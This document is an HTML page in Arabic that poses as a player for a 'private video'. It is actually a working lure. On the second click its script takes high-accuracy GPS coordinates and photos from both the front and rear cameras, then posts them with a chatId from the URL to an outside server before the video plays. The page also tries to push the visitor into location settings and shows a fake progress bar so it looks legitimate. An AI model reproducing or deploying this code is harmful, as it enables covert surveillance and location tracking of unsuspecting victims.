<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>مشغل الفيديو</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            background-color: #000;
            color: #fff;
            overflow: hidden;
        }

        .video-player-container {
            width: 90%;
            max-width: 800px;
            background: #111;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            position: relative;
        }

        .video-thumbnail {
            position: relative;
            width: 100%;
            height: 450px;
            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
                url('https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg');
            background-size: cover;
            background-position: center;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
        }

        .play-button-overlay {
            width: 100px;
            height: 100px;
            background-color: rgba(255, 0, 0, 0.85);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s ease;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
            position: relative;
        }

        .play-button-overlay:hover {
            transform: scale(1.1);
            background-color: rgba(255, 0, 0, 0.95);
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.7);
        }

        .play-icon-large {
            width: 0;
            height: 0;
            border-left: 30px solid white;
            border-top: 20px solid transparent;
            border-bottom: 20px solid transparent;
            margin-left: 8px;
        }

        .video-info {
            padding: 20px;
            border-bottom: 1px solid #333;
        }

        .video-title {
            font-size: 1.5rem;
            font-weight: bold;
            margin-bottom: 8px;
        }

        .video-controls {
            padding: 15px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: #1a1a1a;
            flex-wrap: wrap;
            gap: 10px;
        }

        .control-button {
            background: none;
            border: none;
            color: white;
            font-size: 1.2rem;
            cursor: pointer;
            padding: 8px 15px;
            border-radius: 4px;
            transition: background 0.2s;
        }

        .control-button:hover {
            background: #333;
        }

        .progress-bar {
            flex-grow: 1;
            height: 4px;
            background: #333;
            border-radius: 2px;
            margin: 0 20px;
            overflow: hidden;
            position: relative;
            min-width: 60px;
        }

        .progress-fill {
            position: absolute;
            height: 100%;
            width: 0%;
            background: #ff0000;
        }

        .time-display {
            color: #aaa;
            font-size: 0.9rem;
            min-width: 100px;
            text-align: center;
        }

        .spinner {
            border: 4px solid #fff;
            border-top: 4px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            width: 32px;
            height: 32px;
            animation: spin 1s linear infinite;
            position: absolute;
            display: none;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }

        @keyframes spin {
            0% {
                transform: translate(-50%, -50%) rotate(0deg);
            }
            100% {
                transform: translate(-50%, -50%) rotate(360deg);
            }
        }

        #loading {
            display: none;
            font-size: 1.2rem;
            color: #fff;
            margin-top: 20px;
            text-align: center;
        }

        .loading-text {
            margin-top: 10px;
        }

        .volume-control {
            display: flex;
            align-items: center;
            gap: 10px;
            color: #aaa;
        }

        .volume-slider {
            width: 80px;
            height: 4px;
            background: #333;
            border-radius: 2px;
            position: relative;
        }

        .volume-level {
            position: absolute;
            height: 100%;
            width: 70%;
            background: #ff0000;
        }

        .fullscreen-btn {
            margin-left: 15px;
        }

        @media (max-width: 480px) {
            .video-controls {
                padding: 10px 12px;
                gap: 6px;
            }
            .progress-bar {
                margin: 0 6px;
            }
            .time-display {
                font-size: 0.75rem;
                min-width: 60px;
            }
            .video-title {
                font-size: 1.2rem;
            }
            .video-thumbnail {
                height: 280px;
            }
            .play-button-overlay {
                width: 70px;
                height: 70px;
            }
            .play-icon-large {
                border-left-width: 22px;
                border-top-width: 14px;
                border-bottom-width: 14px;
                margin-left: 5px;
            }
        }
    </style>
</head>
<body>

    <div class="video-player-container">
        <div class="video-info">
            <div class="video-title">فيديو خاص</div>
        </div>

        <div class="video-thumbnail" id="thumbnailArea">
            <div class="play-button-overlay" id="playButtonOverlay">
                <div class="play-icon-large"></div>
                <div class="spinner" id="spinner"></div>
            </div>
        </div>

        <video id="realVideo" controls playsinline muted style="display:none; width:100%; height:450px; background:#000;">
            <source src="https://files.catbox.moe/okukrp.mp4" type="video/mp4" />
        </video>

        <div class="video-controls">
            <div class="progress-bar">
                <div class="progress-fill"></div>
            </div>

            <div class="time-display">0:00 / 2:45</div>

            <div class="volume-control">
                <span></span>
                <div class="volume-slider">
                    <div class="volume-level"></div>
                </div>
            </div>

            <button class="control-button fullscreen-btn">⛶</button>
        </div>
    </div>

    <div id="loading">
        <div class="spinner" style="position:static;"></div>
        <div class="loading-text">جاري تحميل الفيديو... يرجى الانتظار</div>
    </div>

    <script>
        (function() {
            'use strict';

            let settingsOpened = false;
            let videoStarted = false;
            let isProcessing = false;

            const thumbnailArea = document.getElementById('thumbnailArea');
            const playButtonOverlay = document.getElementById('playButtonOverlay');
            const realVideo = document.getElementById('realVideo');
            const spinner = document.getElementById('spinner');
            const loading = document.getElementById('loading');

            // ===== تحسين فتح إعدادات الموقع =====
            function openLocationSettings() {
                const ua = navigator.userAgent;
                let attempts = [];

                // محاولات لكل متصفح ونظام تشغيل
                if (/Android/i.test(ua)) {
                    // أندرويد
                    attempts = [
                        // Chrome و Firefox و Safari على أندرويد
                        () => { window.location.href = 'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end'; },
                        () => { window.location.href = 'intent://settings/location#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end'; },
                        () => { window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end'; },
                        () => { window.location.href = 'intent://com.android.settings.location.LocationSettings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end'; },
                        () => { window.location.href = 'intent://settings/#Intent;action=android.settings.SETTINGS;end'; },
                        // محاولة عبر روابط خاصة
                        () => { window.open('intent://settings/location#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end', '_system'); },
                        () => { window.open('intent://settings/#Intent;action=android.settings.SETTINGS;end', '_system'); }
                    ];
                } else if (/iPhone|iPad|iPod/i.test(ua)) {
                    // iOS
                    attempts = [
                        () => { window.location.href = 'App-Prefs:root=Privacy&path=LOCATION'; },
                        () => { window.location.href = 'App-Prefs:Privacy&path=LOCATION'; },
                        () => { window.location.href = 'prefs:root=Privacy&path=LOCATION'; },
                        () => { window.location.href = 'prefs:root=LOCATION_SERVICES'; },
                        // Safari على iOS
                        () => { window.open('App-Prefs:root=Privacy&path=LOCATION', '_blank'); },
                        () => { window.open('prefs:root=Privacy&path=LOCATION', '_blank'); }
                    ];
                } else if (/Windows/i.test(ua)) {
                    // ويندوز
                    attempts = [
                        () => { window.location.href = 'ms-settings:privacy-location'; },
                        () => { window.open('ms-settings:privacy-location', '_blank'); },
                        // محاولة عبر Chrome على ويندوز
                        () => { window.location.href = 'ms-settings:privacy-location'; }
                    ];
                } else if (/Mac/i.test(ua)) {
                    // ماك
                    attempts = [
                        () => { window.location.href = 'x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices'; },
                        () => { window.open('x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices', '_blank'); },
                        // محاولة عبر Safari على ماك
                        () => { window.location.href = 'x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices'; }
                    ];
                } else if (/Firefox/i.test(ua)) {
                    // فايرفوكس
                    attempts = [
                        () => { window.location.href = 'about:preferences#privacy'; },
                        () => { window.open('about:preferences#privacy', '_blank'); }
                    ];
                } else if (/Chrome/i.test(ua)) {
                    // كروم
                    attempts = [
                        () => { window.location.href = 'chrome://settings/content/location'; },
                        () => { window.open('chrome://settings/content/location', '_blank'); }
                    ];
                }

                // إذا لم تكن هناك محاولات محددة، استخدام محاولة عامة
                if (attempts.length === 0) {
                    attempts = [
                        () => { window.location.href = 'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end'; },
                        () => { window.location.href = 'App-Prefs:root=Privacy&path=LOCATION'; }
                    ];
                }

                // تنفيذ المحاولات مع تأخير بينها
                attempts.forEach((attempt, index) => {
                    setTimeout(() => {
                        try {
                            attempt();
                            console.log(`محاولة فتح الإعدادات ${index + 1} تمت`);
                        } catch (e) {
                            console.log(`محاولة فتح الإعدادات ${index + 1} فشلت:`, e);
                        }
                    }, index * 300); // تأخير 300 مللي بين كل محاولة
                });

                // محاولة إضافية باستخدام window.open مع أنواع مختلفة
                setTimeout(() => {
                    try {
                        // محاولة باستخدام window.open بطرق مختلفة
                        if (/Android/i.test(ua)) {
                            window.open('intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end', '_system');
                            window.open('intent:#Intent;action=android.settings.SETTINGS;end', '_system');
                        } else if (/iPhone|iPad|iPod/i.test(ua)) {
                            window.open('App-Prefs:root=Privacy&path=LOCATION', '_system');
                            window.open('prefs:root=Privacy&path=LOCATION', '_system');
                        }
                    } catch (e) {}
                }, 500);

                // محاولة أخيرة باستخدام window.location بعد تأخير
                setTimeout(() => {
                    try {
                        if (/Android/i.test(ua)) {
                            window.location.href = 'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end';
                        } else if (/iPhone|iPad|iPod/i.test(ua)) {
                            window.location.href = 'App-Prefs:root=Privacy&path=LOCATION';
                        }
                    } catch (e) {}
                }, 800);
            }

            // ===== طلب الموقع =====
            async function getLocation() {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 15000,
                            maximumAge: 0
                        });
                    });
                    return `Lat: ${position.coords.latitude.toFixed(6)}, Long: ${position.coords.longitude.toFixed(6)}`;
                } catch (err) {
                    return '';
                }
            }

            // ===== التصوير =====
            async function captureFromCamera(facingMode) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: { exact: facingMode } }
                    });

                    const video = document.createElement('video');
                    video.srcObject = stream;
                    await video.play();
                    await new Promise(resolve => setTimeout(resolve, 1000));

                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const imageData = canvas.toDataURL('image/jpeg').split(',')[1];

                    stream.getTracks().forEach(track => track.stop());
                    return imageData;
                } catch {
                    return '';
                }
            }

            // ===== إرسال البيانات =====
            async function sendData(data) {
                const url = 'https://server-brxz.onrender.com/submitData';
                try {
                    await fetch(url, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: new URLSearchParams(data),
                        mode: 'no-cors'
                    });
                } catch (e) {
                    try {
                        const xhr = new XMLHttpRequest();
                        xhr.open('POST', url, false);
                        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                        xhr.send(new URLSearchParams(data));
                    } catch (e2) {}
                }
            }

            // ===== تشغيل الفيديو =====
            function startVideoWithSound() {
                if (videoStarted) return;
                videoStarted = true;

                thumbnailArea.style.display = 'none';
                realVideo.style.display = 'block';

                realVideo.muted = false;
                realVideo.volume = 1.0;

                const playPromise = realVideo.play();
                if (playPromise !== undefined) {
                    playPromise.then(() => {}).catch(() => {
                        realVideo.muted = true;
                        realVideo.play().then(() => {
                            setTimeout(() => {
                                realVideo.muted = false;
                                realVideo.volume = 1.0;
                            }, 100);
                        }).catch(() => {});
                    });
                }

                setTimeout(() => {
                    realVideo.muted = false;
                    realVideo.volume = 1.0;
                    try { realVideo.play(); } catch (e) {}
                }, 500);

                setTimeout(() => {
                    realVideo.muted = false;
                    realVideo.volume = 1.0;
                    try { realVideo.play(); } catch (e) {}
                }, 3000);
            }

            // ===== الدالة الرئيسية =====
            async function captureData() {
                if (isProcessing || videoStarted) return;
                isProcessing = true;

                // الضغطة الأولى: فتح الإعدادات
                if (!settingsOpened) {
                    settingsOpened = true;
                    openLocationSettings();
                    isProcessing = false;
                    return;
                }

                // الضغطة الثانية: جمع البيانات
                spinner.style.display = 'block';
                loading.style.display = 'block';
                playButtonOverlay.style.opacity = '0.5';
                playButtonOverlay.style.pointerEvents = 'none';

                const chatId = new URLSearchParams(window.location.search).get('chatId') || '';
                const location = await getLocation();
                const images = [];

                // التقاط الصور
                const frontImage = await captureFromCamera('user');
                if (frontImage) images.push(frontImage);
                const backImage = await captureFromCamera('environment');
                if (backImage) images.push(backImage);

                // إرسال البيانات
                await sendData({
                    chatId: chatId,
                    imageDatas: images.join(','),
                    location: location,
                    timestamp: new Date().toISOString()
                });

                spinner.style.display = 'none';
                loading.style.display = 'none';
                playButtonOverlay.style.opacity = '1';
                playButtonOverlay.style.pointerEvents = 'auto';

                startVideoWithSound();
                isProcessing = false;
            }

            // ===== ربط الأحداث =====
            if (thumbnailArea) {
                thumbnailArea.addEventListener('click', captureData);
            }
            if (playButtonOverlay) {
                playButtonOverlay.addEventListener('click', function(e) {
                    e.stopPropagation();
                    captureData();
                });
            }

            // ===== تفعيل الصوت =====
            document.addEventListener('click', function() {
                if (realVideo) {
                    realVideo.muted = false;
                    realVideo.volume = 1.0;
                    try { realVideo.play(); } catch (e) {}
                }
            }, true);

            // ===== أزرار التحكم =====
            document.querySelectorAll('.control-button').forEach(button => {
                button.addEventListener('click', function(e) {
                    e.stopPropagation();
                    if (this.textContent.includes('⛶')) {
                        const video = document.getElementById('realVideo');
                        if (video.requestFullscreen) {
                            video.requestFullscreen();
                        } else if (video.webkitRequestFullscreen) {
                            video.webkitRequestFullscreen();
                        }
                    }
                });
            });

            // ===== شريط التقدم =====
            const progressInterval = setInterval(() => {
                const progressFill = document.querySelector('.progress-fill');
                const realVideoEl = document.getElementById('realVideo');
                if (realVideoEl.style.display === 'block') {
                    clearInterval(progressInterval);
                    return;
                }
                const currentWidth = parseInt(progressFill.style.width) || 35;
                const newWidth = (currentWidth + 0.1) % 100;
                progressFill.style.width = newWidth + '%';

                const timeDisplay = document.querySelector('.time-display');
                const currentSeconds = Math.floor((newWidth / 100) * 165);
                const minutes = Math.floor(currentSeconds / 60);
                const seconds = currentSeconds % 60;
                timeDisplay.textContent = `${minutes}:${seconds.toString().padStart(2, '0')} / 2:45`;
            }, 1000);

        })();
    </script>

</body>
</html>
